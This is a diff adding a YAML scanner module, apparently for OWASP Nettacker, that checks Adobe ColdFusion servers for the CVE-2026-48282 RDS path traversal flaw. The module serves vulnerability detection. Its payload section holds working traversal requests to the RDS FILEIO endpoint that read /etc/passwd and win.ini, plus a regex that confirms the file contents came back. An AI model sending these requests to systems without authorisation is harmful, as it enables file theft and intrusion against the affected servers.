@@ -1,0 +1,63 @@
+info:
+  name: adobe_coldfusion_cve_2026_48282_vuln
+  author: OWASP Nettacker Team  
+  severity: 10.0
+  description: >
+    CVE-2026-48282 is a critical path traversal vulnerability (CVSS 10.0) in Adobe ColdFusion. 
+    It enables unauthenticated remote attackers to execute arbitrary code or read/write files by sending 
+    specially crafted HTTP requests to the Remote Development Services (RDS) endpoint.
+    ColdFusion versions 2025.9, 2023.20 and earlier are affected.
+  reference: 
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-48282
+    - https://helpx.adobe.com/uk/security/products/coldfusion/apsb26-68.html
+    - https://www.resecurity.com/fr/blog/article/cve-2026-48282-adobe-coldfusion-rds-path-traversal-leading-to-rce
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve
+    - cve2026
+    - cisa_kev
+    - adobe
+    - coldfusion
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: application/octet-stream
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/CFIDE/main/ide.cfm?ACTION=FILEIO"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 8500
+        data: 
+          nettacker_fuzzer:
+            input_format: "{{rds_payload}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              rds_payload:
+                - '2:STR:100:../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwdSTR:4:READ'
+                - '2:STR:105:..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\Windows\win.iniSTR:4:READ'
+        response:
+          condition_type: and
+          conditions:
+            content:
+              regex: '(?im)(?:root:[^:\r\n]*:0:0:|\[(?:fonts|extensions|mci extensions|files|mail)\])'
+              reverse: false
